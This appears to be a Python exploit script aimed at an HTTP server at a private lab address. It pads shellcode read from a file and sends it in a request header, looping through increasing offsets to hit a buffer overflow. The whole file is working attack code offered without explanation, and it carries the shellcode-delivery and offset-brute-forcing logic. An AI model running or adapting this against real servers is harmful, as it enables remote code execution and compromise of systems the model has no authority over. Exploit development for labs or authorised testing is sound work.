#!/usr/bin/python
import socket
import traceback

host = "192.168.56.101"
port = 8080
size = 2050


def payload():
    shellcode = open("shellcode.bin", "r").read()
    offset = "B" * (size + 1 - len(shellcode))
    url = offset + shellcode[:-1]
    print(url)
    # print(binascii.b2a_hex(shellcode))

    return "GET / HTTP/1.0\r\n" + \
           "Host: %s:%d\r\n" % (host, port) + \
           "User-Agent: curl/7.64.0\r\n" + \
           "Accept: */*\r\n" + \
           "aa: %s" % url + "\r\n" + \
           "\r\n"
    # "AA: " + ("a" * size) + shellcode + "\r\n" + \


def send_req():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    p = payload()

    sock.send(p)

    rbuf = sock.recv(1024)
    resp = ""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    sock.close()
    return resp


####
try:
    for i in range(0, 100000):
        size = i
        print("Trying offset %d" % i)
        resp = send_req()
except:
    print("Exception:")
    print(traceback.format_exc())
